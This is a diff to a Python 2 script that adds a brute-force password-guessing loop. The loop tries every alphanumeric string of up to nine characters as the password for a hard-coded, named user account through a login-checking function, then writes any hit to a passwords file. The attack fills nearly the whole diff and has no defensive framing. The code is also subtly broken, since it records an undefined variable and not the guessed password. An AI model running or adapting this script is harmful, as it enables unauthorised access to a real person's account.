@@ -4,8 +4,11 @@ import cookielib
 my_file = open("out-r.txt", "r+")
 my_file1 = my_file.readlines()
 passwords = open("passwords.txt", "a")
+lst = "abcdefghijklmnopqrstuvwxyz1234567890"
+
 user = 'patrick.zierahn'
-passwd = 'blabla123'
+#passwd = 'blabla123'
+
 
 def check(user, passwd):
 
@@ -41,18 +44,73 @@ def check(user, passwd):
 	b = a.readlines()
 	
 	return len(b)
-	#return len(b)
 
+for a in lst:
+	if check(user, a) == len(my_file1) - 1:
+		print "Juhuu"
+		passwords.write(str(user) + "\n")
+		passwords.write(str(passwd) + "\n")
+	else:
+		print "Oh"
+	for b in lst:
+		if check(user, a + b) == len(my_file1) - 1:
+			print "Juhuu"
+			passwords.write(str(user) + "\n")
+			passwords.write(str(passwd) + "\n")
+		else:
+			print "Oh"
+		for c in lst:
+			if check(user, a + b + c) == len(my_file1) - 1:
+				print "Juhuu"
+				passwords.write(str(user) + "\n")
+				passwords.write(str(passwd) + "\n")
+			
+			for d in lst:
+				if check(user, a + b + c + d) == len(my_file1) - 1:
+					print "Juhuu"
+					passwords.write(str(user) + "\n")
+					passwords.write(str(passwd) + "\n")
+			
+				for e in lst:
+					if check(user, a + b + c + d + e) == len(my_file1) - 1:
+						print "Juhuu"
+						passwords.write(str(user) + "\n")
+						passwords.write(str(passwd) + "\n")
+			
+					for f in lst:
+						if check(user, a + b + c + d + e + f) == len(my_file1) - 1:
+							print "Juhuu"
+							passwords.write(str(user) + "\n")
+							passwords.write(str(passwd) + "\n")
+			
+						for g in lst:
+							if check(user, a + b + c + d + e + f + g) == len(my_file1) - 1:
+								print "Juhuu"
+								passwords.write(str(user) + "\n")
+								passwords.write(str(passwd) + "\n")
+			
+							for h in lst:
+								if check(user, a + b + c + d + e + f + g + h) == len(my_file1) - 1:
+									print "Juhuu"
+									passwords.write(str(user) + "\n")
+									passwords.write(str(passwd) + "\n")
+			
+								for i in lst:
+									if check(user, a + b + c + d + e + f + g + h + i) == len(my_file1) - 1:
+										print "Juhuu"
+										passwords.write(str(user) + "\n")
+										passwords.write(str(passwd) + "\n")
+			
 """
 print check(user, passwd)
 print len(my_file1) - 1
-"""
+
 if check(user, passwd) == len(my_file1) - 1:
 	print "Juhuu"
-	#passwords.write(str(user) + "\n")
-	#passwords.write(str(passwd) + "\n")
+	passwords.write(str(user) + "\n")
+	passwords.write(str(passwd) + "\n")
 else:
 	print "Oh"
-
+"""
 my_file.close()
 passwords.close()
